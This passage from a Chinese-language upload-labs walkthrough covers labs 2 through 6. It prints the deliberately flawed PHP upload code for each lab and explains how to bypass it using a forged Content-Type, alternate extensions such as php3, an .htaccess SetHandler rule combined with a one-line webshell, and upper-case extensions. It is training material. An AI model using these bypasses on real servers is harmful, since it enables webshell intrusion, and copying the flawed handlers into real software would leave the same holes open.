title="content-type绕过(labs-2)"></a><strong>content-type绕过(labs-2)</strong></h3><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]            <br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接上传1.php然后进行抓包<br><img src="/img/upload-labs2.png" srcset="/img/loading.gif" lazyload><br>将content-type里面的 application&#x2F;octet-stream修改成符合规定的内容如image&#x2F;jpeg即可上传成功</p><h3 id="黑名单绕过-labs-3"><a href="#黑名单绕过-labs-3" class="headerlink" title="黑名单绕过(labs-3)"></a><strong>黑名单绕过(labs-3)</strong></h3><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                 <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以可能到做了多种过滤黑名单过滤、删除末尾点、大小写过滤、去除字符串::$DATA</p><p>在 iis 里 asp 禁止上传了，可以上传 asa cer cdx 这些后缀，如在网站里允许.net执行 可以上传 ashx 代替 aspx。如果网站可以执行这些脚本，通过上传后门即可获取 webshell。<br>在不同的中间件中有特殊的情况，如果在 apache 可以开启 application&#x2F;x-httpd-php。在 AddType application&#x2F;x-httpd-php .php .phtml .php3后缀名为 phtml 、php3 均被解析成 php 有的 apache 版本默认就会开启。上传目标中间件可支持的环境的语言脚本即可如.phtml、php3。</p><p>所以这里我们上传1.php3即可</p><h3 id="htaccess重写解析-labs-4"><a href="#htaccess重写解析-labs-4" class="headerlink" title=".htaccess重写解析(labs-4)"></a><strong>.htaccess重写解析(labs-4)</strong></h3><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到这里比上一题多过滤了很多后缀名，所以我们只好尝试上传.htaccess文件以达目的</p><p>这里先来介绍一下.htaccess文件<br>htaccess文件的作用是 可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定 IP 地址的用户、只允许特定 IP 地址的用户、禁止目录列表，以及使用其他文件作为 index 文件等一些功能。在 htaccess 里写入 SetHandler application&#x2F;x-httpd-php 则可以文件重写成 php 文件。要 htaccess 的规则生效 则需要在 apache 开启 rewrite 重写模块，因为 apache是多数都开启这个模块，所以规则一般都生效。</p><p>为了能够将文件重写成php文件需要写入以下一段配置</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;jpg&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>该配置是将jpg重写成php文件，所以我们在jpg文件里面写入一句话木马，上传到服务器会自动变成php文件</p><h3 id="大小写绕过-labs-5"><a href="#大小写绕过-labs-5" class="headerlink" title="大小写绕过(labs-5)"></a><strong>大小写绕过(labs-5)</strong></h3><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里很简单，因为没有设置函数将大写变成小写，直接将php写成PHP、PHp等形式即可绕过黑名单</p><h3 id="空格绕过-labs-6"><a href="#空格绕过-labs-6" class="headerlink" title="空格绕过(labs-6)"></a><strong>空格绕过(labs-6)</strong></h3><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span 